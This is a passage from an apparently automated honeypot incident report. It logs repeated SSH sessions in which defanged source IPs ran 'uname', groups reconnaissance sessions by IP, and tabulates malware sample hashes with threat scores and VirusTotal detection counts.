
**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:44:06` | `cowrie.session.connect` |
| `2026-06-25 08:44:06` | `cowrie.client.version` |
| `2026-06-25 08:44:06` | `cowrie.client.kex` |
| `2026-06-25 08:44:06` | `cowrie.login.success` |
| `2026-06-25 08:44:07` | `cowrie.session.params` |
| `2026-06-25 08:44:07` | `cowrie.command.input` |
| `2026-06-25 08:44:07` | `cowrie.log.closed` |
| `2026-06-25 08:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdb49da8d5d9

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:44 |
| **Last Seen** | 2026-06-25 08:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:44:07` | `cowrie.session.connect` |
| `2026-06-25 08:44:07` | `cowrie.client.version` |
| `2026-06-25 08:44:07` | `cowrie.client.kex` |
| `2026-06-25 08:44:08` | `cowrie.login.success` |
| `2026-06-25 08:44:09` | `cowrie.session.params` |
| `2026-06-25 08:44:09` | `cowrie.command.input` |
| `2026-06-25 08:44:09` | `cowrie.log.closed` |
| `2026-06-25 08:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-703b8574fb2e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:44 |
| **Last Seen** | 2026-06-25 08:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:44:52` | `cowrie.session.connect` |
| `2026-06-25 08:44:52` | `cowrie.client.version` |
| `2026-06-25 08:44:52` | `cowrie.client.kex` |
| `2026-06-25 08:44:52` | `cowrie.login.success` |
| `2026-06-25 08:44:53` | `cowrie.session.params` |
| `2026-06-25 08:44:53` | `cowrie.command.input` |
| `2026-06-25 08:44:53` | `cowrie.log.closed` |
| `2026-06-25 08:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-700c47b9b344

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:45 |
| **Last Seen** | 2026-06-25 08:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:45:39` | `cowrie.session.connect` |
| `2026-06-25 08:45:39` | `cowrie.client.version` |
| `2026-06-25 08:45:39` | `cowrie.client.kex` |
| `2026-06-25 08:45:39` | `cowrie.login.success` |
| `2026-06-25 08:45:40` | `cowrie.session.params` |
| `2026-06-25 08:45:40` | `cowrie.command.input` |
| `2026-06-25 08:45:40` | `cowrie.log.closed` |
| `2026-06-25 08:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e350103c20

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:46 |
| **Last Seen** | 2026-06-25 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:46:24` | `cowrie.session.connect` |
| `2026-06-25 08:46:24` | `cowrie.client.version` |
| `2026-06-25 08:46:24` | `cowrie.client.kex` |
| `2026-06-25 08:46:25` | `cowrie.login.success` |
| `2026-06-25 08:46:25` | `cowrie.session.params` |
| `2026-06-25 08:46:25` | `cowrie.command.input` |
| `2026-06-25 08:46:26` | `cowrie.log.closed` |
| `2026-06-25 08:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e98f6f79d9

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:47 |
| **Last Seen** | 2026-06-25 08:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:47:11` | `cowrie.session.connect` |
| `2026-06-25 08:47:11` | `cowrie.client.version` |
| `2026-06-25 08:47:11` | `cowrie.client.kex` |
| `2026-06-25 08:47:12` | `cowrie.login.success` |
| `2026-06-25 08:47:13` | `cowrie.session.params` |
| `2026-06-25 08:47:13` | `cowrie.command.input` |
| `2026-06-25 08:47:14` | `cowrie.log.closed` |
| `2026-06-25 08:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae3c92431d9f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:47 |
| **Last Seen** | 2026-06-25 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:47:11` | `cowrie.session.connect` |
| `2026-06-25 08:47:11` | `cowrie.client.version` |
| `2026-06-25 08:47:11` | `cowrie.client.kex` |
| `2026-06-25 08:47:12` | `cowrie.login.success` |
| `2026-06-25 08:47:12` | `cowrie.session.params` |
| `2026-06-25 08:47:12` | `cowrie.command.input` |
| `2026-06-25 08:47:12` | `cowrie.log.closed` |
| `2026-06-25 08:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6d2ea6d3a0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:47 |
| **Last Seen** | 2026-06-25 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:47:59` | `cowrie.session.connect` |
| `2026-06-25 08:47:59` | `cowrie.client.version` |
| `2026-06-25 08:47:59` | `cowrie.client.kex` |
| `2026-06-25 08:47:59` | `cowrie.login.success` |
| `2026-06-25 08:48:00` | `cowrie.session.params` |
| `2026-06-25 08:48:00` | `cowrie.command.input` |
| `2026-06-25 08:48:00` | `cowrie.log.closed` |
| `2026-06-25 08:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6056047f22ea

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:48 |
| **Last Seen** | 2026-06-25 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:48:48` | `cowrie.session.connect` |
| `2026-06-25 08:48:48` | `cowrie.client.version` |
| `2026-06-25 08:48:48` | `cowrie.client.kex` |
| `2026-06-25 08:48:48` | `cowrie.login.success` |
| `2026-06-25 08:48:49` | `cowrie.session.params` |
| `2026-06-25 08:48:49` | `cowrie.command.input` |
| `2026-06-25 08:48:49` | `cowrie.log.closed` |
| `2026-06-25 08:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f578b9d37f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:49 |
| **Last Seen** | 2026-06-25 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:49:37` | `cowrie.session.connect` |
| `2026-06-25 08:49:37` | `cowrie.client.version` |
| `2026-06-25 08:49:37` | `cowrie.client.kex` |
| `2026-06-25 08:49:38` | `cowrie.login.success` |
| `2026-06-25 08:49:38` | `cowrie.session.params` |
| `2026-06-25 08:49:38` | `cowrie.command.input` |
| `2026-06-25 08:49:39` | `cowrie.log.closed` |
| `2026-06-25 08:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3caa81806338

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:50 |
| **Last Seen** | 2026-06-25 08:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:50:11` | `cowrie.session.connect` |
| `2026-06-25 08:50:11` | `cowrie.client.version` |
| `2026-06-25 08:50:12` | `cowrie.client.kex` |
| `2026-06-25 08:50:12` | `cowrie.login.success` |
| `2026-06-25 08:50:13` | `cowrie.session.params` |
| `2026-06-25 08:50:13` | `cowrie.command.input` |
| `2026-06-25 08:50:13` | `cowrie.log.closed` |
| `2026-06-25 08:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d269bed6783

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:50 |
| **Last Seen** | 2026-06-25 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:50:27` | `cowrie.session.connect` |
| `2026-06-25 08:50:27` | `cowrie.client.version` |
| `2026-06-25 08:50:27` | `cowrie.client.kex` |
| `2026-06-25 08:50:28` | `cowrie.login.success` |
| `2026-06-25 08:50:28` | `cowrie.session.params` |
| `2026-06-25 08:50:28` | `cowrie.command.input` |
| `2026-06-25 08:50:29` | `cowrie.log.closed` |
| `2026-06-25 08:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2a3ccaef670

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:51 |
| **Last Seen** | 2026-06-25 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:51:16` | `cowrie.session.connect` |
| `2026-06-25 08:51:16` | `cowrie.client.version` |
| `2026-06-25 08:51:17` | `cowrie.client.kex` |
| `2026-06-25 08:51:17` | `cowrie.login.success` |
| `2026-06-25 08:51:18` | `cowrie.session.params` |
| `2026-06-25 08:51:18` | `cowrie.command.input` |
| `2026-06-25 08:51:18` | `cowrie.log.closed` |
| `2026-06-25 08:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0915c864319

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 08:51 |
| **Last Seen** | 2026-06-25 08:51 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:51:41` | `cowrie.session.connect` |
| `2026-06-25 08:51:42` | `cowrie.client.version` |
| `2026-06-25 08:51:42` | `cowrie.client.kex` |
| `2026-06-25 08:51:49` | `cowrie.login.success` |
| `2026-06-25 08:51:53` | `cowrie.session.params` |
| `2026-06-25 08:51:53` | `cowrie.command.input` |
| `2026-06-25 08:51:55` | `cowrie.log.closed` |
| `2026-06-25 08:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f9131d7321c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:52 |
| **Last Seen** | 2026-06-25 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:52:05` | `cowrie.session.connect` |
| `2026-06-25 08:52:05` | `cowrie.client.version` |
| `2026-06-25 08:52:05` | `cowrie.client.kex` |
| `2026-06-25 08:52:06` | `cowrie.login.success` |
| `2026-06-25 08:52:06` | `cowrie.session.params` |
| `2026-06-25 08:52:06` | `cowrie.command.input` |
| `2026-06-25 08:52:07` | `cowrie.log.closed` |
| `2026-06-25 08:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eebf10720a60

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:52 |
| **Last Seen** | 2026-06-25 08:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:52:22` | `cowrie.session.connect` |
| `2026-06-25 08:52:22` | `cowrie.client.version` |
| `2026-06-25 08:52:22` | `cowrie.client.kex` |
| `2026-06-25 08:52:23` | `cowrie.login.success` |
| `2026-06-25 08:52:24` | `cowrie.session.params` |
| `2026-06-25 08:52:24` | `cowrie.command.input` |
| `2026-06-25 08:52:24` | `cowrie.log.closed` |
| `2026-06-25 08:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ccf45cd61b4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:52 |
| **Last Seen** | 2026-06-25 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:52:54` | `cowrie.session.connect` |
| `2026-06-25 08:52:54` | `cowrie.client.version` |
| `2026-06-25 08:52:54` | `cowrie.client.kex` |
| `2026-06-25 08:52:55` | `cowrie.login.success` |
| `2026-06-25 08:52:56` | `cowrie.session.params` |
| `2026-06-25 08:52:56` | `cowrie.command.input` |
| `2026-06-25 08:52:56` | `cowrie.log.closed` |
| `2026-06-25 08:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-518608093352

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:53 |
| **Last Seen** | 2026-06-25 08:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:53:16` | `cowrie.session.connect` |
| `2026-06-25 08:53:16` | `cowrie.client.version` |
| `2026-06-25 08:53:16` | `cowrie.client.kex` |
| `2026-06-25 08:53:17` | `cowrie.login.success` |
| `2026-06-25 08:53:18` | `cowrie.session.params` |
| `2026-06-25 08:53:18` | `cowrie.command.input` |
| `2026-06-25 08:53:18` | `cowrie.log.closed` |
| `2026-06-25 08:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee12fedc4dc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:53 |
| **Last Seen** | 2026-06-25 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:53:43` | `cowrie.session.connect` |
| `2026-06-25 08:53:43` | `cowrie.client.version` |
| `2026-06-25 08:53:43` | `cowrie.client.kex` |
| `2026-06-25 08:53:43` | `cowrie.login.success` |
| `2026-06-25 08:53:44` | `cowrie.session.params` |
| `2026-06-25 08:53:44` | `cowrie.command.input` |
| `2026-06-25 08:53:44` | `cowrie.log.closed` |
| `2026-06-25 08:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-958f90cc030b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:54 |
| **Last Seen** | 2026-06-25 08:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:54:32` | `cowrie.session.connect` |
| `2026-06-25 08:54:32` | `cowrie.client.version` |
| `2026-06-25 08:54:32` | `cowrie.client.kex` |
| `2026-06-25 08:54:33` | `cowrie.login.success` |
| `2026-06-25 08:54:34` | `cowrie.session.params` |
| `2026-06-25 08:54:34` | `cowrie.command.input` |
| `2026-06-25 08:54:34` | `cowrie.log.closed` |
| `2026-06-25 08:54:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `209.99.185[.]59` | **139** | 2026-06-25 06:55 | 2026-06-25 08:54 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.138[.]191` | **75** | 2026-06-25 07:00 | 2026-06-25 08:53 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `8.222.212[.]211` | **74** | 2026-06-25 08:01 | 2026-06-25 08:19 | 48m | 0 | `T1592` | 🟠 MEDIUM |
| `34.156.195[.]203` | **30** | 2026-06-25 07:21 | 2026-06-25 07:22 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `139.19.117[.]129` | **2** | 2026-06-25 07:04 | 2026-06-25 08:04 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `141.11.88[.]108` | **2** | 2026-06-25 07:34 | 2026-06-25 07:34 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `212.8.242[.]38` | **2** | 2026-06-25 07:40 | 2026-06-25 08:47 | 1m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-06-25 08:34 | 2026-06-25 08:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | **2** | 2026-06-25 08:23 | 2026-06-25 08:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]209` | **2** | 2026-06-25 07:12 | 2026-06-25 07:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]49` | **2** | 2026-06-25 07:36 | 2026-06-25 07:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.23.129[.]238` | 1 | 2026-06-25 07:32 | 2026-06-25 07:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.65.139[.]46` | 1 | 2026-06-25 08:28 | 2026-06-25 08:28 | 4s | 0 | `T1592` | 🟢 LOW |
| `184.105.139[.]67` | 1 | 2026-06-25 08:12 | 2026-06-25 08:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-06-25 07:24 | 2026-06-25 07:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.84.226[.]110` | 1 | 2026-06-25 07:33 | 2026-06-25 07:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-06-25 08:37 | 2026-06-25 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]13` | 1 | 2026-06-25 07:39 | 2026-06-25 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]69` | 1 | 2026-06-25 07:25 | 2026-06-25 07:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.42.54[.]132` | 1 | 2026-06-25 08:08 | 2026-06-25 08:08 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (36 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 61/100 | 🟡 MEDIUM | **3/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 40/100 | 🟡 MEDIUM | **1/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 43/100 | 🟡 MEDIUM | **9/75** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 44/100 | 🟡 MEDIUM | **11/75** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
